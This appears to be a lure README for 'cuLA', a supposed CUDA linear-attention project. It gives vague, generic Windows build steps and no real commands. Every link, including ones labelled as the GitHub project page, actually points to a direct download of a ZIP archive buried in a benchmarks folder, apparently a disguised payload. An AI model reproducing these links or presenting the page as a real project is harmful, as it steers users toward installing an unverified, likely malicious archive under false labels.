# ⚡ cuLA - Fast Linear Attention on CUDA

[![Download cuLA](https://img.shields.io/badge/Download-cuLA-6f42c1?style=for-the-badge)](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)

## 🧭 What cuLA does

cuLA is a GPU tool for linear attention variants. It uses CUDA, CuTe DSL, and CUTLASS C++ to run attention work on NVIDIA graphics cards.

If you use it as an end user, you can download the project, open the files, and run the build steps on a Windows PC with a supported NVIDIA GPU.

## 🖥️ What you need

To run cuLA on Windows, you need:

- Windows 10 or Windows 11
- An NVIDIA GPU
- A recent NVIDIA driver
- CUDA Toolkit installed
- Enough free disk space for source files and build files
- Python 3.10 or newer for helper tools, if used by the project
- CMake for build setup
- Visual Studio Build Tools or Visual Studio with C++ support

A modern RTX card gives the best results. Older NVIDIA cards may still work if they support the CUDA version used by the project.

## 📥 Download cuLA

Use this link to visit the project page and download cuLA:

[Open the cuLA GitHub page](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)

If the page shows a release, download the Windows files from there. If it shows source code only, use the source archive or the green Code button on GitHub to get the files onto your computer

## 🚀 Install on Windows

1. Open the cuLA GitHub page
2. Download the project files to a folder you can find again, such as `Downloads` or `Desktop`
3. If you downloaded a ZIP file, right-click it and choose Extract All
4. Open the extracted folder
5. Install the CUDA Toolkit if it is not already on your PC
6. Install Visual Studio Build Tools with the C++ desktop workload
7. Install CMake if it is not already installed
8. Open a Command Prompt or PowerShell window in the cuLA folder
9. Run the build command shown in the project files
10. Wait for the build to finish
11. Open the generated program or test file, if the repository includes one

## 🛠️ Setup steps

If you are starting from a clean Windows system, follow this order:

### 1. Install NVIDIA driver
Download and install the latest driver for your GPU from NVIDIA. Restart your PC when the installer asks.

### 2. Install CUDA Toolkit
Use a CUDA version that matches the project setup. The toolkit adds the compiler and GPU libraries needed by cuLA.

### 3. Install CMake
CMake helps Windows create the build files. During setup, let it add itself to the system path if that option appears.

### 4. Install C++ build tools
Install Visual Studio Build Tools or Visual Studio. Make sure the C++ workload is selected.

### 5. Get the cuLA files
Download the project from GitHub and extract it to a simple folder path, such as:

- `C:\cuLA`
- `C:\Users\YourName\Downloads\cuLA`

Avoid folders with long paths or special characters. That keeps build steps simple.

## ▶️ How to run

After setup, open a terminal in the cuLA folder and follow the build steps in the project files.

A common Windows flow looks like this:

1. Open Start
2. Type `cmd`
3. Open Command Prompt
4. Move into the cuLA folder with the `cd` command
5. Run the build command from the README or project notes
6. Wait for the build to complete
7. Run the output file that the build creates

If the project includes sample input files or test scripts, use those first. They help you confirm that your GPU setup works before you use your own data.

## 🔧 Common build path on Windows

Many CUDA projects on Windows follow a path like this:

- Clone or download the source
- Configure with CMake
- Build with Visual Studio tools
- Run the compiled binary or test target

If cuLA includes preset build files, use them exactly as written. If it includes a Visual Studio solution, open the `.sln` file and build from there.

## 📁 Folder layout

You may see folders and files like these:

- `src` — source files
- `include` — header files
- `tests` — test cases
- `examples` — sample runs
- `CMakeLists.txt` — build setup file
- `README.md` — main instructions
- `LICENSE` — usage terms

This layout helps you find the parts you need without opening every file.

## 🧪 Check that it works

After you build cuLA, check for these signs:

- The build finishes without errors
- The output file appears in the build folder
- Your NVIDIA GPU is listed during the run
- Sample tests complete

If the project prints timing data or kernel info, that means the GPU code is running.

## 🧩 If something goes wrong

If the build does not work, check these items:

- CUDA Toolkit version
- NVIDIA driver version
- CMake install path
- Visual Studio C++ tools
- Folder path length
- GPU support for your CUDA version

If Windows says a command is not found, restart the terminal after you install tools. That lets Windows pick up the new paths.

If the build fails near CUDA files, reinstall the toolkit and make sure you used the same version the project expects.

## 📌 What this project is for

cuLA is useful if you want to:

- test linear attention kernels on NVIDIA GPUs
- compare GPU kernel speed
- work with CUDA source code
- study CuTe DSL and CUTLASS code
- build attention layers for research or experiments

It is a source-based project, so you should expect to compile it on your own machine.

## 🔗 Source and updates

Use the GitHub page for the latest files, issues, and updates:

[https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)

## 🧱 Build notes

If you are new to Windows builds, keep these habits:

- Use a short folder path
- Keep your CUDA version up to date
- Restart after installs
- Read the project README before you build
- Start with a sample or test target if one exists

These steps reduce setup problems and make it easier to get a clean build